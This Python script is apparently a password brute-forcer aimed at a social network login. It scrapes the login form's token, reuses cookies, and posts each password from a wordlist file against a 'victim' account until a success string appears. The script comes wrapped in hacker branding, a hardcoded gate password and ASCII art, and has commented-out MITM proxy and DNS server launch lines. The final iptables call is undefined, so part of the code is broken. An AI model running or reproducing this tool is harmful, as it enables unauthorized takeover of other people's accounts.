import requests
import threading
# import urllib.request
# import os
from bs4 import BeautifulSoup
import sys
try:
	if sys.version_info[0] < 3:
		raise "REQUIRED PYTHON 3.x"
except Exception as ex:
	print(''' \033[0;93m--[WEbsite]----*-----https://www.yehia1hacker.com-----*--------''')
	sys.exit()
post_url='*************URL RECOVERY***********'
headers = {
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
payload={}
cookie={}
def create_form():
	form=dict()
	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
	data=requests.get(post_url,headers=headers)
	# print('Form Creating : ',data.url)
	# print('Return Status : ',data.status_code)
	#for i in data.headers:
	#	print(i,' : ',data.headers[i])
	for i in data.cookies:
		cookie[i.name]=i.value
	data=BeautifulSoup(data.text,'html.parser').form
	if data.input['name']=='lsd':
		form['lsd']=data.input['value']
	return (form,cookie)

def function(email,passw,i):
	global payload,cookie
	if i%10==1:
		payload,cookie=create_form()
		payload['email']=email
	payload['pass']=passw
	# print(payload)
	# print(cookie)
	# print('lsd : ',payload['lsd'])
	# print(cookie)
	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
	if 'Find Friends' in r.text:
		print('password is ',passw)
		#open('d.html','w').write(r.text)
		return True
	return False

#payload=create_form()

uname=input("\033[0;32menter user name=-💬-  ")
passwd=""
attempt=0
flag=0
while(attempt!=10000000000):
    passwd=input("\033[0;33menter password- 👁  🔰-🔰-☢️  ")
    if(passwd=="yehia1hacker"):
        flag=1
        break
    else:
        attempt=attempt+1
        if(attempt==10000000000):
            print("you have tried maximum number of time")
if(flag==1):
    print("welcome ✅ ",uname.upper () )


print             ('\033[1;34;47m**********YEhia---_HacKer*********\033[1;37;40m")_')
print('\033[0;91m------------------------------------------------------------------------------------------')
print('\033[0;91m------------`::+.``````````````````````WOLF````````````````````.+/:```````````HACKER``````')
print('\033[0;91m````````````-o`-os:::-````````````````````````````````````-:::so-`o-``````````````````````')
print('\033[0;91m````````````s/:-`oo+oos+.``````````````````````````````./soo+oo`-:/s``````````````````````')
print('\033[0;91m```yo-s+:-/so/oy+-``````````.`..`.``````````-oyo/os/-:+s-oy``````````````````````')
print('\033[0;91m\033[1;31m````````````s+-      :yo/sy+----:o-//oooo+o//-o:----+ys/oy:      -+y``````````````````````')
print('\033[0;91m````````````oo`       .:y:ohyo+++o+oo/s//s/oo+++o+oyho:y/.-      `oo``````````````````````')
print('\033[0;91m````````````oy`       ``oo.oy--//::-/:-..--/-:://--yo.oo``:      `yo``````````````````````')
print('\033[0;91m````````````+s--ohyo:...:o`.+.      o:````:oo//:-..+.`o:...:ohho--s+``````````````````````')
print('\033[0;91m````````````/+:`-yyyyyso/.`.....`/-:+s+..+s+:-/`.....`./osyyyhy-`:+/``````````````````````')
print('\033[0;91m``````````...o:../-+/+:..``.++so/::o/-+//+-/s::/os++.``..:+/+-/..:o...````````````````````')
print('\033[0;91m`````````.:+/+/-.````..``./:/ss+oo.::/..../::-oo+ss/:/.``..```..-/+/+:.```````````````````')
print('\033[0;91m`````````:+++:-:---:+so+-:ss/:/-//-+so/``/+s+-//-/:/ss:-+os+:--::-:+++:```````````````````')
print('\033[0;91m`````````.++/:-.`.:++/:..:sys/yos//:+yo..oyo-//ssy/sys:..:/++:.`.-:/++.```````````````````')
print('\033[0;91m```````.---://--``-::-/++++syys:/--oo/-::-++o--+:syys++++/-::-``--:/:---.`````````````````')
print('\033[0;91m```````.--:/+o:-`.:+shho:...-/::.`.shyo..oyhs.`.::/....-ohhs+:.`-:o+/:--.`````````````````')
print('\033[0;91m```````.-/++/-.:+syhhhh+:/h+//-.``.sy/s//s/hy.``.-//+h/:+hhhhhs+:.-/++/-.`````````````````')
print('\033[0;91m``````.:++ooo/.`:oyhhhy-`__________-:--oo--:-.__________-yhhhyo:`./ooo++:.````````````````')
print('\033[0;92m`````.+/++o/:.```-+yhyoo: Yehia  ..-.+/.-../       Hacker  ooyhy+.```.:/o++/+.```````````````')
print("\033[0;92m--------/--/----------   ╱▔▔▔▔╲╭╭╮       / /      ╱▔▔▔▔╲╭╭╮  --------------/----/-------")
print('\033[0;92m--------/--/--------- ╰╲╲▏▂╲╱▂▕╱╱╯      / /    ╰╲╲▏▂╲╱▂▕╱╱╯  --------------/----/------ ')
print('\033[0;92m--------/--/--------  ┈┈╲▏▇▏▕▇▕╱┈┈      / /    ┈┈╲▏▇▏▕▇▕╱┈┈  --------------/----/-------')
print('\033[0;92m--------/--/--------  ┈┈╱╲▔▕▍▔╱╲┈┈      / /    ┈┈╱╲▔▕▍▔╱╲┈┈  --------------/----/-------')
print('\033[0;92m--------/--/--------  ╭╱╱▕╋╋╋╋▏╲╲╮      / /    ╭╱╱▕╋╋╋╋▏╲╲╮  --------------/----/---------')
print('\033[0;92m--------/--/--------   ╯╯┈╲▂▂╱┈╰╰╯      / /     ╯╯┈╲▂▂╱┈╰╰╯  --------------/----/---------')
print('\033[0;91m```````-/o/-:/-..+shys/-.__________...:^^^^^^^.__________-/syys/.`-/::/o/:`/````/``````````')
print('\033[0;91m``````-++//+:-../-/sssoo//:-+/--.```.`.//.`.``..--/+:://oosss/:/..-:+/:++-````````````````')
print('\033[0;91m/.``````.--/yyo:`:/:--```:syyyyyys:``.--:/:`:oyy/:--``````./+:--````````````````')
print('\033[0;91m``````-+o//:-:/++/:---/-.-.//-..``./+++yy+++/.``..-//...-/--.:/++/:-://o+-````````````````')
print('\033[0;91m`````:ooo/:+/+ss+-.`-:.``..-/-..``.+osooooso+```..-/-.```.:-`.-+ss+/+:/ooo:```````````````')
print('\033[0;91m`````:+++///:.-s/:/+o/:-::/::+:--``-ossyyyso-``--:+::/::-:/o+///s-.:///+++:```````````````')
print('\033[0;91m````````.:+oo:.o+ssys/:+syo+-:hs+:---/++++/---:+sh--+oys+:/syso+o.:+o+:.``````````````````')
print('\033[0;91m`````````-//o/.s+/++osoosyho-.ohh/./::....::/./hho.-ohysooso++/+s./o//-```````````````````')
print('\033[0;91m````````.o-/o/.-.----.`--::/:+:yh/`:-+:++:+-:`/hy:+:/::--`.----.-./o/-o.``````````````````')
print('\033[0;91m`````````-`.++::oo++//.`.//-.:ooos`ssyyyyyyss`sooo:.-//.`.//++oo::++.`-```````````````````')
print('\033[0;91m````````````:+.::/+os+:.:++-..osoooyyhhyyhhhyossso..-++:.:+so+/::.+:``````````````````````')
print('\033[0;91m```````````````.:-:+/:+o//:-:--yo/yyssssssssyh/oy--::://o+//+:--.`````````````````````````')
print('\033[0;91m`-----------------..``.-/+//::`/s//        :o+/s+`::/++/-.``..````````````````````````````')
print('\033[0;91m-----------------------..:++:-..s::   WOLF  //:s..::++:..---------------------------------')
print('\033[0;91m-----------------------``-:+o+:.o-/:        :/-o.:/o+:-`----------------------------------')
print('\033[0;91m-----------------------````.-:..:+:+        +/+:..:-.` -----------------------------------')
print('\033[0;91m`````````````````````````````.:.`s-:/syhhhs/:-s`.:.```````````````````````````````````````')
print('\033[0;91m``````````````````````````````.+`++-.//////.-++`+.````````````````````````````````````````')
print('\033[0;91m```````````````````````````````/:.+oooooooo+o+.::`````````````````````````````````````````')
print('\033[0;91m````````````````````````````````/:.-/+osso+/-.:/``````````````````````````````````````````')
print('\033[0;91m`````````````````````````````````-::-......-::-```````````````````````````````````````````')
print('\033[0;91m------------- `````````````````````-::::::::-`````````````````````````````````````````````')


print("          \033[1;33mWelcome\033[1;37;40m 🗣️   🙋‍",uname.upper () )


print('🕵  🕵   🎭 🎭 🎭 🎭 🎭 🎭 🎭 🎭 🎭 🎭 🎭 🎭 🎭 🎭 🎭 🎭' )

file=open('yehia1hacker.txt','r')
i=0
email=input('\033[0;31mPlace the recovery link for the victim after decoding~YeHia~ : ')
print("")
print("\033[0;96mWaiting for the penetration test ⌛  ⌛  : ",email)
print("")
while file:
	passw=file.readline().strip()
	i+=1
	print("\033[1;32mTrying Password ⌛ " + str(i) +": ",passw)
	if function(email,passw,i):
		break
	# threading.Thread(target=function,args=(email,passw,i)).start()
	# if not i%10:

    
    #os.system("rm -r " + script_path + "yehia1hacker.db > /dev/null 2>&1")

    #os.system("sudo screen -S yehia1hacker-mitm -m -d mitmdump -T --host -s " + script_path + "proxyScript.py")
    #os.system("sudo screen -S yehia1hacker-dns -m -d python3 " + script_path + "dnsServer.py")
    #refreshNetworkInfo()
iptables("setup")


		# os.system('pause')


